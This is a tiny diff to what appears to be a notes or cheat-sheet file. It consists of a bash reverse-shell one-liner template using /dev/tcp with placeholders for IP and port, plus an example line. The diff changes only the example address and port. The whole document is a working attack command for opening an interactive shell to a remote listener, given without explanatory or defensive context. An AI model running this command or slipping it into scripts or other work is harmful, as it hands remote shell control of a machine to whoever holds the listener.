@@ -2,4 +2,4 @@
 
 bash -i >& /dev/tcp/{IP}/{port} 0>&1
 
-example: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
+example: bash -i >& /dev/tcp/10.9.8.7/1234 0>&1
